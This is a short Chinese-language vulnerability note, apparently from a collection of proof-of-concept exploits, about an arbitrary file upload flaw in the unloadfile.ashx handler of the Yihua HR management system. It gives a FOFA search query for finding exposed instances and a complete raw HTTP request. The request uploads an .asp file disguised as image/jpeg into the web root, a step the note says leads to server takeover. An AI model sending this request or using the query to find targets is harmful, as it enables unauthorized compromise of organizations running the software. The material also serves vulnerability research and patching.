## 亿华人力资源管理系统unloadfile存在任意文件上传漏洞

亿华人力资源管理系统unloadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## fofa

```
body="亿华人力资源管理系统"
```

## poc

```yaml
POST /handle/unloadfile.ashx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="file"; filename="stc.asp"
Content-Type: image/jpeg

test
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="action"

unloadfile
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="filepath"

./
-----------------------------21909179191068471382830692394—
```

![image-20240707203045130](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072030195.png)